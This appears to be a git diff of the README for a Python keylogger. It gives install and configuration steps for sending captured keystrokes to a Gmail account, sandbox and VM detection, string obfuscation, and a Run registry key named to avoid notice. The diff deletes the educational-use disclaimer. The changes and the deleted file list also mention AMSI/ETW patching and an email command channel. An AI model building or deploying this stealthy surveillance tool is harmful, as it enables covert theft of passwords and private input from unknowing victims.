@@ -22,20 +22,19 @@ Python keylogger with email exfiltration, encrypted local backup, and anti-detec
 ## Requirements
 
 - Python 3.8+
+- Dependencies: `pynput`, `pywin32`, `requests`
 - Gmail account with an [App Password](https://support.google.com/accounts/answer/185833) (2FA must be enabled)
 
 ## Setup
 
 1. Install dependencies:
    ```
-   pip install -r requirements.txt
+   pip install pynput pywin32 requests
    ```
 
-2. Copy the example config and fill in your credentials:
-   ```
-   copy config.example.py config.py
-   ```
-   Edit `config.py` with your Gmail address and app password.
+2. Configure `config.py`:
+   - Set your Gmail credentials (sender/receiver/app password)
+   - Adjust `SEND_INTERVAL`, `PERSISTENCE`, `DEBUG`, and anti-detection toggles as needed
 
 3. Run directly:
    ```
@@ -98,22 +97,11 @@ On timer fire:
 ## Project Structure
 
 ```
-pykelogger.py          — main entry point: keyboard listener, email send, persistence
-config.example.py      — config template (copy to config.py and fill in credentials)
-config.py              — your personal config (gitignored, not in repo)
-keylogger.cpp          — C++ alternative keylogger with SMTP
-kky.py                 — minimal keylogger prototype
-antidetect.py          — sandbox/VM/debugger/sandbox detection checks
-evasion.py             — AMSI/ETW patching for AV evasion
-keyhook.py             — low-level Windows keyboard hook (alternative to pynput)
-obfuscation.py         — base64 encode/decode helpers for string obfuscation
-crypto_utils.py        — AES/Fernet encryption with PBKDF2 key derivation
-storage.py             — encrypted persistent storage with auto-rotation
-log_utils.py           — centralized debug logging
-pykelogger.spec        — PyInstaller build configuration
-plugins/keylogger.py   — keylogger as a plugin module
-c2/email.py            — email C2 channel for log exfiltration
-c2/parser.py           — command parser for email-based commands
+pykelogger.py      — main entry point: keyboard listener, email send, persistence
+config.py          — all configurable settings and credentials
+antidetect.py      — sandbox/VM/debugger/sandbox detection checks
+obfuscation.py     — base64 encode/decode helpers for string obfuscation
+pykelogger.spec    — PyInstaller build configuration
 ```
 
 ## Notes
@@ -121,11 +109,3 @@ c2/parser.py           — command parser for email-based commands
 - Gmail requires an App Password (not your regular password). Enable 2FA on the account, then generate an app password at https://myaccount.google.com/apppasswords.
 - The executable will be flagged by some AVs regardless of obfuscation — this is inherent to keylogging software. The anti-detection measures reduce static signature hits but do not guarantee full evasion.
 - `PERSISTENCE` writes to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` with a value name that does not contain obvious keywords.
-
-## Disclaimer
-
-This tool is provided for **educational and authorized security testing purposes only**. Unauthorized use of keyloggers or surveillance software against systems or individuals without explicit consent is illegal and unethical. The developer assumes no responsibility for misuse or damage caused by this software. By using this project, you agree to comply with all applicable local, state, federal, and international laws.
-
-## Developed By
-
-**Micato**
